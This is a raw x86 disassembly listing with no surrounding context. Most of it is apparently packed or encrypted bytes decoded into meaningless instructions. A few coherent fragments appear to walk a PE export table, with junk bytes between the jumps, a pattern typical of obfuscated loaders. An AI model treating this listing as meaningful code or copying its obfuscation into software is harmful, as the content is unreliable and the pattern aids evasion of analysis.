  40ecad:	dec    ebx
  40ecae:	pop    edi
  40ecaf:	mov    al,0xc
  40ecb1:	add    cl,dl
  40ecb3:	out    0x5f,al
  40ecb5:	pop    ecx
  40ecb6:	cmp    BYTE PTR [edx],al
  40ecb8:	out    0xd2,eax
  40ecba:	push   es
  40ecbb:	bound  eax,QWORD PTR [ecx-0x564f56de]
  40ecc1:	mov    ebx,0x8ff5f875
  40ecc6:	fdiv   st,st(6)
  40ecc8:	push   0x46
  40ecca:	out    dx,al
  40eccb:	cmc    
  40eccc:	mov    ch,ch
  40ecce:	dec    esi
  40eccf:	cli    
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	add    DWORD PTR [esi+esi*2-0x13],edx
  40ecd5:	adc    al,0xf9
  40ecd7:	xor    BYTE PTR [ebx],0xa3
  40ecda:	sbb    al,0x99
  40ecdc:	outs   dx,DWORD PTR ds:[esi]
  40ecdd:	into   
  40ecde:	daa    
  40ecdf:	add    dl,BYTE PTR [ebx]
  40ece1:	mov    dl,0x33
  40ece3:	inc    eax
  40ece4:	jl     0x40ec6f
  40ece6:	inc    ebp
  40ece7:	in     al,dx
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx-0x5506e389],eax
  40ed29:	sahf   
  40ed2a:	add    al,0xa6
  40ed2c:	jo     0x40ed9e
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ecf8
  40ed33:	jnp    0x40ed97
  40ed35:	pusha  
  40ed36:	scas   al,BYTE PTR es:[edi]
  40ed37:	loopne 0x40ed25
  40ed39:	in     eax,dx
  40ed3a:	ja     0x40ed03
  40ed3c:	or     eax,0x8a454bad
  40ed41:	rcr    BYTE PTR ds:0x51e95fff,0x42
  40ed48:	and    edx,DWORD PTR [eax+edx*2-0x31982e86]
  40ed4f:	push   ds
  40ed50:	int    0x4
  40ed52:	aaa    
  40ed53:	inc    eax
  40ed54:	bound  esp,QWORD PTR [esi]
  40ed56:	ret    0x8375
  40ed59:	adc    ebx,esp
  40ed5b:	imul   ecx,DWORD PTR [edi+edi*8+0x7c],0xc7d5a47
  40ed63:	adc    BYTE PTR [esi-0x70d5d051],bh
  40ed69:	outs   dx,BYTE PTR ds:[esi]
  40ed6a:	aaa    
  40ed6b:	pop    ecx
  40ed6c:	fisub  DWORD PTR [ebx-0xa]
  40ed6f:	das    
  40ed70:	push   0x34
  40ed72:	xchg   ecx,eax
  40ed73:	push   ecx
  40ed74:	repnz aaa 
  40ed76:	je     0x40ed93
  40ed78:	adc    ecx,esp
  40ed7a:	lods   eax,DWORD PTR ds:[esi]
  40ed7b:	imul   edi,DWORD PTR [esi+edx*2-0x3a],0x2e
  40ed80:	shr    al,0xea
  40ed83:	mov    WORD PTR [ecx+0x3a54bdf],ss
  40ed89:	jmp    0xfb130f6e
  40ed8e:	mov    bl,0xe7
  40ed90:	push   0x4f4147a4
  40ed95:	ret    
  40ed96:	push   edx
  40ed97:	fidivr DWORD PTR [ebx+0x19c7067d]
  40ed9d:	fdivr  QWORD PTR ds:0xbf01eaa0
  40eda3:	pop    esi
  40eda4:	lds    eax,FWORD PTR [edi+0x26d64fb]
  40edaa:	fwait
  40edab:	bound  edi,QWORD PTR [ecx-0x46]
  40edae:	lds    edx,FWORD PTR [edx+0x7d3254ca]
  40edb4:	imul   ebx,esp,0xffffffe2
  40edb7:	adc    eax,DWORD PTR [ebp+0x75]
  40edba:	xor    al,0x19
  40edbc:	mov    eax,ds:0x272faca0
  40edc1:	sub    esi,eax
  40edc3:	pop    esp
  40edc4:	(bad)  
  40edc5:	scas   eax,DWORD PTR es:[edi]
  40edc6:	aaa    
  40edc7:	mov    eax,0xd5ad99a
  40edcc:	mov    ebx,0xf0b6e2dd
  40edd1:	(bad)  
  40edd2:	sbb    eax,0xff216608
  40edd7:	test   eax,0x34bb4872
  40eddc:	xor    al,0x1f
  40edde:	jae    0x40ee49
  40ede0:	ret    
  40ede1:	imul   ebp,DWORD PTR [ebx+0x4],0xf24864a6
  40ede8:	shr    DWORD PTR [ebx-0x5f3c664d],0x19
  40edef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf0:	mov    dh,0xd3
  40edf2:	shl    DWORD PTR [ebx],cl
  40edf4:	pop    edi
  40edf5:	pop    esp
  40edf6:	mov    DWORD PTR [edi-0x705a1b7c],ebx
  40edfc:	mov    cs,WORD PTR [eax]
  40edfe:	lahf   
  40edff:	jp     0x40edb2
  40ee01:	ds out dx,al
  40ee03:	test   DWORD PTR [esi],edx
  40ee05:	ds es dec ebx
  40ee08:	js     0x40edeb
  40ee0a:	je     0x40ee50
  40ee0c:	mov    dh,0xbe
  40ee0e:	stos   DWORD PTR es:[edi],eax
  40ee0f:	das    
  40ee10:	or     DWORD PTR [edx+0x4f],esp
  40ee13:	and    ch,BYTE PTR [eax]
  40ee15:	inc    esi
  40ee16:	out    0xd,al
  40ee18:	sub    esi,esp
  40ee1a:	or     cl,BYTE PTR [ecx+0x45]
  40ee1d:	add    DWORD PTR [ebp+0x4b],esp
  40ee20:	icebp  
  40ee21:	sbb    BYTE PTR [ecx-0x6d],bh
  40ee24:	(bad)  
  40ee25:	test   eax,0x6749f6e
  40ee2a:	ins    BYTE PTR es:[edi],dx
  40ee2b:	div    DWORD PTR [edx+0x38fa70f]
  40ee31:	ins    BYTE PTR es:[edi],dx
  40ee32:	into   
  40ee33:	dec    ebx
  40ee34:	daa    
  40ee35:	ins    DWORD PTR es:[edi],dx
  40ee36:	or     dl,BYTE PTR [esi]
  40ee38:	daa    
  40ee39:	xor    BYTE PTR [edx-0x4f],bh
  40ee3c:	jmp    0x423f:0x88bd7848
  40ee43:	sub    al,0xf3
  40ee45:	ror    BYTE PTR [esi+0x73],0xc
  40ee49:	out    dx,al
  40ee4a:	pop    ss
  40ee4b:	adc    eax,0x575111e4
  40ee50:	jmp    0xe4d9:0xf58e0bf5
  40ee57:	cli    
  40ee58:	mov    ah,0x9
  40ee5a:	arpl   di,cx
  40ee5c:	mov    es,WORD PTR [edx]
  40ee5e:	test   al,0x5a
  40ee60:	gs std 
  40ee62:	mov    dh,0xf
  40ee64:	test   BYTE PTR [ebx+0xf],cl
  40ee67:	icebp  
  40ee68:	pushf  
  40ee69:	jb     0x40eed8
  40ee6b:	enter  0x4f14,0xa3
  40ee6f:	xor    cl,BYTE PTR [ecx-0x6ced1a6d]
  40ee75:	sub    ch,BYTE PTR [ecx-0x1e8d659f]
  40ee7b:	loope  0x40ee10
  40ee7d:	mov    ebp,0x95729829
  40ee82:	jno    0x40eee7
  40ee84:	int3   
  40ee85:	jmp    0x7ca0:0xe60c4cc7
  40ee8c:	and    DWORD PTR [esi+0x5c],eax
  40ee8f:	jmp    0x3d01a9cd
  40ee94:	in     al,dx
  40ee95:	mov    ds:0x2877db9e,al
  40ee9a:	jo     0x40ee27
  40ee9c:	ror    DWORD PTR [ebp+0x1b],0xf1
  40eea0:	pop    ebp
  40eea1:	dec    ebp
  40eea2:	loop   0x40eee0
  40eea4:	(bad)  [ebx-0x40]
  40eea7:	lds    ebx,FWORD PTR [ecx]
  40eea9:	mov    ah,0x19
  40eeab:	out    0x15,eax
  40eead:	ud1    esi,DWORD PTR [edx+0x2b]
  40eeb1:	adc    DWORD PTR [esi+ebx*1+0x7a9e5e80],edx
  40eeb8:	jle    0x40ee42
  40eeba:	mov    bl,0xaa
  40eebc:	xchg   edi,eax
  40eebd:	ret    
  40eebe:	inc    esi
  40eebf:	push   esi
  40eec0:	scas   eax,DWORD PTR es:[edi]
  40eec1:	inc    ebp
  40eec2:	adc    BYTE PTR [ebx-0x22],dl
  40eec5:	mov    eax,0x7a509d5b
  40eeca:	mov    bl,0xb7
  40eecc:	out    dx,al
  40eecd:	sub    edi,0xb
  40eed0:	ins    BYTE PTR es:[edi],dx
  40eed1:	and    eax,DWORD PTR [esi-0x6d8034ee]
  40eed7:	imul   ebx,DWORD PTR [ebx-0x7e2505a9],0x1c
  40eede:	jbe    0x40eee5
  40eee0:	fldenv [edx+eax*4]
  40eee3:	scas   al,BYTE PTR es:[edi]
  40eee4:	loopne 0x40eedf
  40eee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eee7:	leave  
  40eee8:	adc    esi,DWORD PTR [ebp-0x68]
  40eeeb:	push   cs
  40eeec:	pop    edi
  40eeed:	dec    esi
  40eeee:	repnz pop eax
  40eef0:	inc    ecx
  40eef1:	leave  
  40eef2:	out    dx,eax
  40eef3:	(bad)  
  40eef4:	shr    BYTE PTR [edx-0x66],cl
  40eef7:	dec    esi
  40eef8:	cs ins DWORD PTR es:[edi],dx
  40eefa:	xchg   BYTE PTR [eax-0x19],ch
  40eefd:	loop   0x40ef3f
  40eeff:	push   cs
  40ef00:	dec    ebp
  40ef01:	icebp  
  40ef02:	sbb    al,BYTE PTR [ebp-0x6a698d86]
  40ef08:	or     al,0xc6
  40ef0a:	aas    
  40ef0b:	iret   
  40ef0c:	stos   BYTE PTR es:[edi],al
  40ef0d:	add    BYTE PTR [edi],0xd3
  40ef10:	ins    DWORD PTR es:[edi],dx
  40ef11:	test   al,0x9e
  40ef13:	adc    eax,0xea2d19f6
  40ef18:	xlat   BYTE PTR ds:[ebx]
  40ef19:	sub    edx,edi
  40ef1b:	mov    ebp,0x9b341e7d
  40ef20:	test   BYTE PTR [edx],dl
  40ef22:	sub    eax,0x74c82e47
  40ef27:	add    eax,0x8fe054c1
  40ef2c:	ret    
  40ef2d:	loopne 0x40ef12
  40ef2f:	shl    BYTE PTR [eax+ecx*2],cl
  40ef32:	jno    0x40ef75
  40ef34:	ss pusha 
  40ef36:	sbb    ah,dh
  40ef38:	sub    al,0x1d
  40ef3a:	xor    eax,0x7f
  40ef3d:	pushf  
  40ef3e:	and    eax,0x743741bd
  40ef43:	lods   eax,DWORD PTR ds:[esi]
  40ef44:	mov    ch,0x28
  40ef46:	adc    BYTE PTR [edx+ebp*8+0xe63ea30],ch
  40ef4d:	jg     0x40eee3
  40ef4f:	ss mov ch,0xfe
  40ef52:	xor    al,0x9c
  40ef54:	sbb    edi,DWORD PTR [esi-0x2b]
  40ef57:	mov    ds:0xf48b73ac,eax
  40ef5c:	and    DWORD PTR [edx-0x3130dc65],edx
  40ef62:	hlt    
  40ef63:	xor    cl,dl
  40ef65:	inc    edi
  40ef66:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef68:	dec    edi
  40ef69:	ficomp WORD PTR [esi+0x28012f1f]
  40ef6f:	jmp    0x4998:0x7451e7fb
  40ef76:	sbb    ah,dh
  40ef78:	cmp    BYTE PTR [ebp-0x76],0x8d
  40ef7c:	push   0x55
  40ef7e:	cwde   
  40ef7f:	push   ebp
  40ef80:	fs push 0x68
  40ef83:	mov    ah,0x9
  40ef85:	push   ss
  40ef86:	sbb    ebp,DWORD PTR [esi]
  40ef88:	jmp    0x40ef23
  40ef8a:	jmp    DWORD PTR [esi-0x7ed5ca4d]
  40ef90:	sub    BYTE PTR [ecx-0x4cf94fba],bl
  40ef96:	xchg   edi,esp
  40ef98:	mov    bh,0x82
  40ef9a:	mov    WORD PTR [ebx+0x7e],es
  40ef9d:	shr    cl,1
  40ef9f:	add    BYTE PTR [eax-0x65ba5a2c],0x22
  40efa6:	mov    ds:0x4d2f3aac,eax
  40efab:	mov    ah,0x92
  40efad:	idiv   DWORD PTR [ecx-0x7cfe30c9]
  40efb3:	jecxz  0x40f00a
  40efb5:	ds das 
  40efb7:	push   es
  40efb8:	pop    esi
  40efb9:	outs   dx,DWORD PTR ds:[esi]
  40efba:	iret   
  40efbb:	push   ds
  40efbc:	hlt    
  40efbd:	jecxz  0x40f03c
  40efbf:	push   esi
  40efc0:	fmul   QWORD PTR [edx+edx*1]
  40efc3:	mov    edx,DWORD PTR [edi*2+0x45024e9]
  40efca:	in     eax,dx
  40efcb:	push   es
  40efcc:	loopne 0x40ef93
  40efce:	mov    ch,0x9b
  40efd0:	mov    al,ds:0x5a959258
  40efd5:	ret    0xbb60
  40efd8:	push   edi
  40efd9:	jp     0x40efb3
  40efdb:	pop    edx
  40efdc:	out    0xb5,al
  40efde:	cmp    al,0x9b
  40efe0:	cmp    DWORD PTR [edx-0x3],ecx
  40efe3:	mov    ch,0xa5
  40efe5:	add    BYTE PTR [edx],bl
  40efe7:	cmp    BYTE PTR [esi-0x1d],cl
  40efea:	outs   dx,BYTE PTR ds:[esi]
  40efeb:	jnp    0x40f01d
  40efed:	push   esi
  40efee:	mov    dl,0x5d
  40eff0:	icebp  
  40eff1:	and    edx,DWORD PTR [edx]
  40eff3:	mov    ch,0x71
  40eff5:	sub    eax,0x8d8ed5e8
  40effa:	iret   
  40effb:	fcmovbe st,st(2)
  40effd:	mov    al,ds:0xd442c3e1
  40f002:	push   es
  40f003:	jl     0x40f01e
  40f005:	or     eax,0x475b8386
  40f00a:	in     al,dx
  40f00b:	mov    ebp,0x10a93cc1
  40f010:	ret    
  40f011:	jne    0x40f03c
  40f013:	fidivr WORD PTR [esi+0xc5eb06d]
  40f019:	call   0xa10724bb
  40f01e:	data16 je 0x40f078
  40f021:	mov    ds:0xea4aa5f7,al
  40f026:	sti    
  40f027:	push   ss
  40f028:	push   esp
  40f029:	xor    cl,dl
  40f02b:	lods   al,BYTE PTR ds:[esi]
  40f02c:	rcl    DWORD PTR [edx],1
  40f02e:	jb     0x40f0a9
  40f030:	pop    ebp
  40f031:	(bad)  
  40f032:	sub    dl,bl
  40f034:	add    eax,0xd7d1d86a
  40f039:	pop    eax
  40f03a:	call   0x6f5a:0xfc5f6f9f
  40f041:	jne    0x40f058
  40f043:	(bad)  
  40f044:	or     al,0x99
  40f046:	fisttp WORD PTR [ebx+edi*8]
  40f049:	add    DWORD PTR [ecx],ebp
  40f04b:	jno    0x40f06f
  40f04d:	mov    dl,0xcc
  40f04f:	fdivr  DWORD PTR [ecx+0x7f]
  40f052:	push   es
  40f053:	daa    
  40f054:	push   ss
  40f055:	outs   dx,BYTE PTR ds:[esi]
  40f056:	(bad)  
  40f057:	aaa    
  40f058:	mov    edi,0x41812bb4
  40f05d:	sti    
  40f05e:	sahf   
  40f05f:	push   esp
  40f060:	jo     0x40f019
  40f062:	aam    0xe4
  40f064:	in     al,dx
  40f065:	stos   BYTE PTR es:[edi],al
  40f066:	pop    ecx
  40f067:	out    dx,eax
  40f068:	sbb    edi,ebp
  40f06a:	pop    edx
  40f06b:	xchg   esp,esi
  40f06d:	pop    esp
  40f06e:	mov    ebx,0xc0ebeed6
  40f073:	fimul  WORD PTR [eax+0x69]
  40f076:	push   cs
  40f077:	ins    BYTE PTR es:[edi],dx
  40f078:	pop    ebp
  40f079:	aas    
  40f07a:	xchg   edi,eax
  40f07b:	ins    BYTE PTR es:[edi],dx
  40f07c:	jle    0x40f0f4
  40f07e:	lahf   
  40f07f:	inc    esi
  40f080:	cmp    al,BYTE PTR [edx+0x5746d326]
  40f086:	aas    
  40f087:	push   ss
  40f088:	mov    ebx,0xa8f753dc
  40f08d:	mov    BYTE PTR [esp+eax*8],cl
  40f090:	jle    0x40f089
  40f092:	leave  
  40f093:	stos   BYTE PTR es:[edi],al
  40f094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f095:	retf   0xc555
  40f098:	pop    esp
  40f099:	pop    ebp
  40f09a:	or     al,0x7f
  40f09c:	push   esi
  40f09d:	ins    BYTE PTR es:[edi],dx
  40f09e:	neg    BYTE PTR [ebx+0x4e]
  40f0a1:	xchg   esi,eax
  40f0a2:	pop    ebp
  40f0a3:	cmp    cl,BYTE PTR [eax-0x7]
  40f0a6:	js     0x40f100
  40f0a8:	bnd jmp 0x40f0ec
  40f0ab:	hlt    
  40f0ac:	arpl   WORD PTR [ebx],bx
  40f0ae:	dec    ebp
  40f0af:	mov    bl,0x78
  40f0b1:	dec    ecx
  40f0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0b3:	rcl    BYTE PTR [eax-0x7f9fa66],1
  40f0b9:	(bad)  
  40f0ba:	repnz cmp eax,DWORD PTR [ebp-0x2fc62396]
  40f0c1:	test   esi,ebp
  40f0c3:	jge    0x40f0a0
  40f0c5:	aam    0x1a
  40f0c7:	adc    al,0xc4
  40f0c9:	clc    
  40f0ca:	enter  0xc02a,0x13
  40f0ce:	xor    BYTE PTR [edi-0x58],al
  40f0d1:	outs   dx,BYTE PTR ds:[esi]
  40f0d2:	dec    esp
  40f0d3:	ror    dl,1
  40f0d5:	jae    0x40f0da
  40f0d7:	xor    dh,BYTE PTR ds:0x7c49936d
  40f0dd:	pusha  
  40f0de:	sub    al,0xdb
  40f0e0:	mov    ah,0x40
  40f0e2:	cmp    eax,0xa3b0feb0
  40f0e7:	mov    bl,0xbe
  40f0e9:	xchg   esp,eax
  40f0ea:	idiv   eax
  40f0ec:	pop    ecx
  40f0ed:	sbb    al,0x84
  40f0ef:	rcr    BYTE PTR [esp+eiz*8-0x73aea647],1
  40f0f6:	lock jns 0x40f176
  40f0f9:	cmp    eax,0x536dbfd9
  40f0fe:	jg     0x40f113
  40f100:	xor    eax,0xd78fa332
  40f105:	pop    ecx
  40f106:	cmc    
  40f107:	out    dx,eax
  40f108:	aaa    
  40f109:	add    ecx,DWORD PTR [eax+0x24]
  40f10c:	mov    DWORD PTR [ebp-0x2c],ecx
  40f10f:	mov    eax,DWORD PTR [ebp-0x14]
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0xab
  40f12a:	and    al,0x1d
  40f12c:	outs   dx,BYTE PTR ds:[esi]
  40f12d:	pop    ebp
  40f12e:	mov    ds:0x7d497070,eax
  40f133:	jo     0x40f1a5
  40f135:	mov    ds:0x939ed941,eax
  40f13a:	aaa    
  40f13b:	ins    DWORD PTR es:[edi],dx
  40f13c:	jge    0x40f150
  40f13e:	xor    BYTE PTR [ebx+0x29],al
  40f141:	sbb    cl,BYTE PTR [eax]
  40f143:	sub    eax,0xd4bf85ce
  40f148:	fwait
  40f149:	inc    ecx
  40f14a:	arpl   WORD PTR ds:[eax],cx
  40f14d:	aam    0x3a
  40f14f:	xlat   BYTE PTR ds:[ebx]
  40f150:	mov    eax,0xf69441f7
  40f155:	ret    
  40f156:	add    DWORD PTR [ebp+0x7b],esp
  40f159:	test   DWORD PTR [eax-0x7de3f218],0x6aac156b
  40f163:	pop    ecx
  40f164:	scas   eax,DWORD PTR es:[edi]
  40f165:	lds    edi,FWORD PTR [ebx+ecx*2]
  40f168:	das    
  40f169:	xchg   ebx,eax
  40f16a:	jnp    0x40f125
  40f16c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f16d:	std    
  40f16e:	jmp    0x40f18a
  40f170:	jecxz  0x40f0f6
  40f172:	and    BYTE PTR [ecx+0x7e],0xf0
  40f176:	pop    edi
  40f177:	fcmovb st,st(5)
  40f179:	cli    
  40f17a:	mov    al,0xc3
  40f17c:	aaa    
  40f17d:	rol    ecx,0x7c
  40f180:	loopne 0x40f1f0
  40f182:	pop    esp
  40f183:	cwde   
  40f184:	mov    al,ds:0x433b97f4
  40f189:	pop    ecx
  40f18a:	addr16 hlt 
  40f18c:	push   ds
  40f18d:	jbe    0x40f208
  40f18f:	arpl   ax,sp
  40f191:	adc    ebp,DWORD PTR [esi]
  40f193:	dec    ebx
  40f194:	outs   dx,BYTE PTR ds:[esi]
  40f195:	xchg   esi,eax
  40f196:	and    al,0xe2
  40f198:	jg     0x40f1cf
  40f19a:	sbb    al,0xe4
  40f19c:	jb     0x40f15d
  40f19e:	rol    BYTE PTR [esi+0x5d],cl
  40f1a1:	xchg   al,ch
  40f1a3:	retf   0x40ec
  40f1a6:	aad    0x9c
  40f1a8:	xlat   BYTE PTR ds:[ebx]
  40f1a9:	add    DWORD PTR [ebx+0x65],ecx
  40f1ac:	sub    al,BYTE PTR ds:0x33447054
  40f1b2:	jno    0x40f1f3
  40f1b4:	pop    ecx
  40f1b5:	pop    ecx
  40f1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b7:	fst    QWORD PTR [ecx]
  40f1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ba:	inc    ebx
  40f1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1bc:	fadd   QWORD PTR [ebp-0x5]
  40f1bf:	add    eax,0xcead345b
  40f1c4:	out    dx,al
  40f1c5:	cmp    DWORD PTR [eax],ebp
  40f1c7:	cwde   
  40f1c8:	xchg   edi,eax
  40f1c9:	pop    ds
  40f1ca:	in     al,0x85
  40f1cc:	push   ecx
  40f1cd:	jne    0x40f15b
  40f1cf:	icebp  
  40f1d0:	test   ah,dh
  40f1d2:	icebp  
  40f1d3:	sbb    al,BYTE PTR [ecx-0x7433abba]
  40f1d9:	(bad)  
  40f1da:	cmp    al,0xc3
  40f1dc:	cmp    al,0x6f
  40f1de:	stos   DWORD PTR es:[edi],eax
  40f1df:	ss aaa 
  40f1e1:	push   0xffffffa6
  40f1e3:	pop    eax
  40f1e4:	(bad)  
  40f1e6:	mov    edx,0x3a89ebcd
  40f1eb:	mov    ecx,0xe2555280
  40f1f0:	loopne 0x40f199
  40f1f2:	or     eax,0xdb3bca5b
  40f1f7:	jmp    0xde09:0xd2f10886
  40f1fe:	clc    
  40f1ff:	imul   edi,DWORD PTR [ebp-0x1f83bf8e],0x7c
  40f206:	sbb    BYTE PTR [edi],0x47
  40f209:	fiadd  DWORD PTR [esi+edi*8-0x4b4ca94b]
  40f210:	fimul  WORD PTR [edx+0x519425a6]
  40f216:	repnz dec edi
  40f218:	adc    DWORD PTR [ebx+edi*4],ecx
  40f21b:	or     eax,0x7972c39
  40f220:	sub    ah,BYTE PTR fs:[eax-0x33ea40b6]
  40f227:	push   ebx
  40f228:	jge    0x40f1db
  40f22a:	xchg   esp,eax
  40f22b:	and    edx,DWORD PTR [ecx]
  40f22d:	or     BYTE PTR [bx+di],bl
  40f230:	inc    ebx
  40f231:	sbb    eax,DWORD PTR [ecx+0x13]
  40f234:	adc    DWORD PTR [edx+0x2c25a1],ebx
  40f23a:	push   ebp
  40f23b:	mov    eax,?
  40f23d:	add    al,0x84
  40f23f:	ins    DWORD PTR es:[di],dx
  40f241:	jno    0x40f2ba
  40f243:	je     0x40f27c
  40f245:	in     eax,0xa5
  40f247:	xor    BYTE PTR fs:[edx-0x274100d4],ah
  40f24e:	xchg   dh,al
  40f250:	arpl   WORD PTR [eax-0x344e0da9],bp
  40f256:	lahf   
  40f257:	xor    eax,DWORD PTR [ecx-0x7f]
  40f25a:	fsubr  QWORD PTR [edi+eax*2]
  40f25d:	aam    0xea
  40f25f:	rcr    BYTE PTR [eax+0xb],1
  40f262:	jmp    0xe5c065a6
  40f267:	out    0xe3,eax
  40f269:	jo     0x40f262
  40f26b:	daa    
  40f26c:	ins    BYTE PTR es:[edi],dx
  40f26d:	cmp    DWORD PTR [esp+edi*8+0x2a],0x4787d51
  40f275:	adc    al,0x12
  40f277:	adc    ah,BYTE PTR [esi-0x28]
  40f27a:	xchg   ebp,eax
  40f27b:	(bad)  
  40f27c:	xchg   ecx,eax
  40f27d:	loope  0x40f2ec
  40f27f:	pusha  
  40f280:	cmp    bh,dh
  40f282:	inc    BYTE PTR [edi+0x53]
  40f285:	and    al,0xf5
  40f287:	cmp    BYTE PTR [edx-0x5f],bl
  40f28a:	ret    
  40f28b:	aas    
  40f28c:	std    
  40f28d:	mov    edx,es
  40f28f:	fwait
  40f290:	shr    cl,cl
  40f292:	aam    0x4d
  40f294:	dec    ecx
  40f295:	call   0x75cb:0x8524e3ec
  40f29c:	rol    bh,cl
  40f29e:	jmp    0x40f2bd
  40f2a0:	test   DWORD PTR [edi],esi
  40f2a2:	adc    BYTE PTR [eax+0x1cc345c5],ah
  40f2a8:	push   ss
  40f2a9:	mov    ebp,0x462c5f59
  40f2ae:	out    dx,eax
  40f2af:	xchg   edx,esp
  40f2b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b2:	or     BYTE PTR [esp+edx*1-0x6a],bl
  40f2b6:	int3   
  40f2b7:	sub    ebp,edx
  40f2b9:	je     0x40f2b0
  40f2bb:	xchg   ecx,eax
  40f2bc:	sub    eax,0x1be6bbd2
  40f2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2c2:	xchg   ecx,eax
  40f2c3:	xchg   bh,al
  40f2c5:	or     DWORD PTR [eax],eax
  40f2c7:	aam    0xdb
  40f2c9:	js     0x40f345
  40f2cb:	ds push ss
  40f2cd:	(bad)  
  40f2ce:	mov    ebx,0xe3b75957
  40f2d3:	sar    DWORD PTR [edi+0x5c],1
  40f2d6:	mov    ch,0x3f
  40f2d8:	in     eax,0x87
  40f2da:	inc    esp
  40f2db:	aam    0x2
  40f2dd:	push   0xf7fbbe6a
  40f2e2:	outs   dx,BYTE PTR ds:[esi]
  40f2e3:	xchg   esp,eax
  40f2e4:	dec    ebx
  40f2e5:	and    cl,BYTE PTR [ebp-0x6a]
  40f2e8:	out    dx,al
  40f2e9:	mov    edx,0xc89cc21c
  40f2ee:	sub    ecx,DWORD PTR [ecx+0x33]
  40f2f1:	int    0xb6
  40f2f3:	ret    0x7db
  40f2f6:	mov    ebx,DWORD PTR [edx-0x68354b4b]
  40f2fc:	or     al,0x44
  40f2fe:	push   edx
  40f2ff:	dec    edx
  40f300:	mov    esp,0x1dd500e
  40f305:	xchg   ebp,edx
  40f307:	rcr    DWORD PTR [ecx-0x46],cl
  40f30a:	xchg   edx,eax
  40f30b:	ja     0x40f32a
  40f30d:	inc    eax
  40f30e:	pmaddwd mm4,QWORD PTR [ebp+0x3ca18aa8]
  40f315:	lahf   
  40f316:	sbb    DWORD PTR [eax],0x43aa326d
  40f31c:	fst    DWORD PTR [ebx-0x1]
  40f31f:	sbb    DWORD PTR [edx+0x36e44e5b],edi
  40f325:	repnz adc ch,BYTE PTR [edx]
  40f328:	xchg   ecx,eax
  40f329:	pop    ss
  40f32a:	test   BYTE PTR [ecx+0xe],dl
  40f32d:	xlat   BYTE PTR ds:[ebx]
  40f32e:	ror    DWORD PTR [eax-0x51],cl
  40f331:	mov    eax,0x6dd82958
  40f336:	mov    ebx,0x17841978
  40f33b:	jno    0x40f35c
  40f33d:	ror    ebx,0xff
  40f340:	dec    eax
  40f341:	popf   
  40f342:	test   al,0xe3
  40f344:	mov    esp,DWORD PTR [esi]
  40f346:	sahf   
  40f347:	and    al,0x48
  40f349:	xor    ah,BYTE PTR [ebx+0x2]
  40f34c:	push   ecx
  40f34d:	xchg   edx,eax
  40f34e:	not    BYTE PTR [ebx-0x785926be]
  40f354:	push   ds
  40f355:	jo     0x40f374
  40f357:	repnz stos BYTE PTR es:[edi],al
  40f359:	imul   ebx
  40f35b:	bound  ebx,QWORD PTR [ebx+0x56]
  40f35e:	sti    
  40f35f:	or     BYTE PTR [esi+0x70],bl
  40f362:	scas   eax,DWORD PTR es:[edi]
  40f363:	out    dx,al
  40f364:	addr16 sub al,0xe2
  40f367:	pop    edx
  40f368:	xchg   DWORD PTR [ebx-0x69],ecx
  40f36b:	pop    esi
  40f36c:	(bad)
  40f36f:	push   ecx
  40f370:	(bad)  
  40f372:	mov    edi,0xc6d41657
  40f377:	lahf   
  40f378:	jae    0x40f3db
  40f37a:	push   cs
  40f37b:	call   0x84ef:0x5015c765
  40f382:	xor    bh,BYTE PTR [ecx+ebp*1+0x2e653991]
  40f389:	out    dx,al
  40f38a:	jge    0x40f3d6
  40f38c:	push   esp
  40f38d:	pop    ss
  40f38e:	push   0xffffffd9
  40f390:	test   al,0x50
  40f392:	and    ah,ah
  40f394:	test   al,0x9d
  40f396:	mov    bl,0x71
  40f398:	repz retf 
  40f39a:	hlt    
  40f39b:	xor    ah,BYTE PTR [esi-0x3f4bf2d8]
  40f3a1:	dec    ebx
  40f3a2:	lods   eax,DWORD PTR ds:[esi]
  40f3a3:	push   eax
  40f3a4:	and    DWORD PTR [esi+esi*2+0x6ebcb9fa],ecx
  40f3ab:	sbb    eax,0xad80137a
  40f3b0:	ss dec esp
  40f3b2:	pop    ds
  40f3b3:	push   eax
  40f3b4:	(bad)  [eax]
  40f3b6:	repz dec ecx
  40f3b8:	aam    0x37
  40f3ba:	sub    DWORD PTR [esi+0x23ab03eb],edx
  40f3c0:	jmp    0x40f380
